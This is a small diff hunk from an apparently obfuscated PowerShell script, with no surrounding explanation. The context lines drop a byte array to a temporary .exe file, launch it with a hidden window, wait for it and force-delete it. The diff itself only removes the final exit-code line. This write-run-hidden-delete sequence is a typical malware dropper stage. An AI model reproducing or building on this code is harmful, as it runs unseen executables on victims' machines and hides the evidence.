@@ -23,4 +23,3 @@ $cjlk=[IO.Path]::GetTempFileName()+'.exe';
 [IO.File]::WriteAllBytes($cjlk,$kajg);
 $_pr=Start-Process -FilePath $cjlk -Wait -PassThru -WindowStyle Hidden;
 Remove-Item $cjlk -Force -EA 0;
-exit $_pr.ExitCode;
